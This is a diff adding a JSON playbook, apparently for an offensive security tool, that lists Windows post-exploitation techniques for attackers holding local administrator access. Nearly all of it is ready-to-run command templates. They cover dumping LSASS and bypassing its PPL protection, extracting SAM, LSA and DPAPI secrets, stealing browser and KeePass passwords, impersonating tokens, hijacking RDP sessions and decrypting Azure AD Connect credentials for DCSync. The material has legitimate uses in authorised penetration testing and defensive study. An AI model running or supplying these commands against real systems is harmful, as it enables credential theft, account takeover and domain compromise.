@@ -1,0 +1,304 @@
+{
+  "service": "windows-admin",
+  "description": "Local administrator access techniques for credential extraction and privilege escalation on Windows hosts",
+  "ports": [],
+  "serviceNames": [],
+  "targetOs": ["windows"],
+  "vectors": [
+    {
+      "id": "admin-lsass-dump",
+      "name": "Extract Credentials from LSASS",
+      "phase": "credential_access",
+      "prerequisites": ["admin_access"],
+      "description": "Dump LSASS process memory to extract credentials, NTLM hashes, and Kerberos tickets",
+      "commands": [
+        {
+          "tool": "procdump.exe",
+          "command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+          "description": "Create LSASS dump file"
+        },
+        {
+          "tool": "mimikatz",
+          "command": "privilege::debug\ntoken::elevate\nsekurlsa::logonpasswords",
+          "description": "Extract credentials from LSASS"
+        },
+        {
+          "tool": "lsassy",
+          "command": "lsassy -d <domain> -u <user> -p <password> <ip>",
+          "description": "Remote LSASS dumping"
+        },
+        {
+          "tool": "nxc",
+          "command": "nxc smb <ip_range> -u <user> -p <password> -M lsassy",
+          "description": "Dump LSASS across multiple hosts"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "admin-lsass-ppl-bypass",
+      "name": "Bypass LSASS Protected Process",
+      "phase": "credential_access",
+      "prerequisites": ["admin_access"],
+      "description": "Bypass PPL (Protected Process Light) protection on LSASS to extract credentials",
+      "commands": [
+        {
+          "tool": "PPLdump64.exe",
+          "command": "PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp",
+          "description": "Dump protected LSASS process"
+        },
+        {
+          "tool": "mimikatz",
+          "command": "!+\n!processprotect /process:lsass.exe /remove\nprivilege::debug\ntoken::elevate\nsekurlsa::logonpasswords\n!processprotect /process:lsass.exe\n!-",
+          "description": "Remove PPL and dump credentials"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "admin-sam-dump",
+      "name": "Extract SAM Database Hashes",
+      "phase": "credential_access",
+      "prerequisites": ["admin_access"],
+      "description": "Extract local account password hashes from SAM database",
+      "commands": [
+        {
+          "tool": "nxc",
+          "command": "nxc smb <ip_range> -u <user> -p <password> --sam",
+          "description": "Dump SAM hashes remotely"
+        },
+        {
+          "tool": "mimikatz",
+          "command": "privilege::debug\nlsadump::sam",
+          "description": "Dump SAM locally with Mimikatz"
+        },
+        {
+          "tool": "reg",
+          "command": "reg save HKLM\\SAM <file>\nreg save HKLM\\SYSTEM <file>",
+          "description": "Save SAM and SYSTEM hives"
+        },
+        {
+          "tool": "secretsdump.py",
+          "command": "secretsdump.py -system SYSTEM -sam SAM LOCAL",
+          "description": "Extract hashes from saved hives"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "admin-lsa-secrets",
+      "name": "Extract LSA Secrets",
+      "phase": "credential_access",
+      "prerequisites": ["admin_access"],
+      "description": "Extract LSA secrets including service account passwords and cached credentials",
+      "commands": [
+        {
+          "tool": "nxc",
+          "command": "nxc smb <ip_range> -u <user> -p <password> --lsa",
+          "description": "Dump LSA secrets remotely"
+        },
+        {
+          "tool": "mimikatz",
+          "command": "privilege::debug\nlsadump::secrets",
+          "description": "Dump LSA secrets locally"
+        },
+        {
+          "tool": "reg",
+          "command": "reg save HKLM\\SECURITY <file>\nreg save HKLM\\SYSTEM <file>",
+          "description": "Save SECURITY and SYSTEM hives"
+        },
+        {
+          "tool": "secretsdump.py",
+          "command": "secretsdump.py -system SYSTEM -security SECURITY LOCAL",
+          "description": "Extract secrets from saved hives"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "admin-dpapi-extraction",
+      "name": "Extract DPAPI Credentials",
+      "phase": "credential_access",
+      "prerequisites": ["admin_access"],
+      "description": "Extract and decrypt DPAPI protected credentials (Chrome passwords, WiFi, RDP, etc.)",
+      "commands": [
+        {
+          "tool": "nxc",
+          "command": "nxc smb <ip_range> -u <user> -p <password> --dpapi",
+          "description": "Extract DPAPI credentials remotely"
+        },
+        {
+          "tool": "donpapi",
+          "command": "donpapi <domain>/<user>:<password>@<target>",
+          "description": "Comprehensive DPAPI extraction"
+        },
+        {
+          "tool": "dpapidump.py",
+          "command": "dpapidump.py <domain>/<user>:<password>@<target>",
+          "description": "Dump DPAPI secrets"
+        },
+        {
+          "tool": "SharpDPAPI.exe",
+          "command": "SharpDPAPI.exe triage",
+          "description": "Local DPAPI triage"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "admin-dpapi-masterkey",
+      "name": "Extract DPAPI Master Keys",
+      "phase": "credential_access",
+      "prerequisites": ["admin_access"],
+      "description": "Extract DPAPI master keys from LSASS for offline credential decryption",
+      "commands": [
+        {
+          "tool": "mimikatz",
+          "command": "sekurlsa::dpapi",
+          "description": "Extract master keys from LSASS"
+        },
+        {
+          "tool": "lsassy",
+          "command": "lsassy -d <domain> -u <user> -p <password> <ip> -m rdrleakdiag -M masterkeys",
+          "description": "Extract master keys remotely"
+        },
+        {
+          "tool": "dploot.py",
+          "command": "dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>",
+          "description": "Use master keys to decrypt browser data"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "admin-token-impersonation",
+      "name": "Token Impersonation",
+      "phase": "privilege_escalation",
+      "prerequisites": ["admin_access"],
+      "description": "Impersonate logged-on user tokens to execute commands as other users",
+      "commands": [
+        {
+          "tool": "incognito",
+          "command": "use incognito\nimpersonate_token <domain>\\<user>",
+          "description": "Impersonate user token"
+        },
+        {
+          "tool": "nxc",
+          "command": "nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users",
+          "description": "List logged-on users"
+        },
+        {
+          "tool": "nxc",
+          "command": "nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>",
+          "description": "Execute as logged-on user"
+        },
+        {
+          "tool": "irs.exe",
+          "command": "irs.exe list",
+          "description": "List available tokens"
+        },
+        {
+          "tool": "irs.exe",
+          "command": "irs.exe exec -p <pid> -c <command>",
+          "description": "Execute command with token"
+        }
+      ],
+      "outcomes": ["privilege_escalation"]
+    },
+    {
+      "id": "admin-masky-impersonation",
+      "name": "Token Impersonation via ADCS (Masky)",
+      "phase": "credential_access",
+      "prerequisites": ["admin_access"],
+      "description": "Use ADCS to obtain certificates for logged-on users for credential extraction",
+      "commands": [
+        {
+          "tool": "masky",
+          "command": "masky -d <domain> -u <user> (-p <password> || -k || -H <hash>) -ca <certificate authority> <ip>",
+          "description": "Extract credentials via ADCS impersonation"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "admin-rdp-session-hijack",
+      "name": "RDP Session Hijacking",
+      "phase": "lateral_movement",
+      "prerequisites": ["admin_access"],
+      "description": "Hijack active RDP sessions without knowing user password",
+      "commands": [
+        {
+          "tool": "psexec.exe",
+          "command": "psexec.exe -s -i cmd",
+          "description": "Get SYSTEM shell"
+        },
+        {
+          "tool": "query",
+          "command": "query user",
+          "description": "List RDP sessions"
+        },
+        {
+          "tool": "tscon.exe",
+          "command": "tscon.exe <id> /dest:<session_name>",
+          "description": "Hijack RDP session"
+        }
+      ],
+      "outcomes": ["lateral_movement"]
+    },
+    {
+      "id": "admin-keepass-extraction",
+      "name": "Extract KeePass Database",
+      "phase": "credential_access",
+      "prerequisites": ["admin_access"],
+      "description": "Extract credentials from KeePass password manager",
+      "commands": [
+        {
+          "tool": "KeePwn.py",
+          "command": "KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t <target> --plugin KeeFarceRebornPlugin.dll",
+          "description": "Add KeePass export plugin"
+        },
+        {
+          "tool": "KeePwn.py",
+          "command": "KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t <target>",
+          "description": "Trigger KeePass export"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "admin-azure-ad-connect",
+      "name": "Azure AD Connect Credential Extraction",
+      "phase": "credential_access",
+      "prerequisites": ["admin_access"],
+      "description": "Extract MSOL account cleartext password from Azure AD Connect server for DCSync",
+      "commands": [
+        {
+          "tool": "azuread_decrypt_msol_v2.ps1",
+          "command": "azuread_decrypt_msol_v2.ps1",
+          "description": "Decrypt MSOL credentials"
+        },
+        {
+          "tool": "nxc",
+          "command": "nxc smb <ip> -u <user> -p <password> -M msol",
+          "description": "Extract MSOL credentials remotely"
+        }
+      ],
+      "outcomes": ["domain_admin", "credential_access"]
+    },
+    {
+      "id": "admin-user-enumeration",
+      "name": "Enumerate Local Users on Hosts",
+      "phase": "reconnaissance",
+      "prerequisites": ["valid_credentials"],
+      "description": "Enumerate local user profiles across multiple hosts to identify high-value targets",
+      "commands": [
+        {
+          "tool": "smbmap.py",
+          "command": "smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csv",
+          "description": "Enumerate Users directories on multiple hosts"
+        }
+      ],
+      "outcomes": ["information_gathered"]
+    }
+  ]
+}
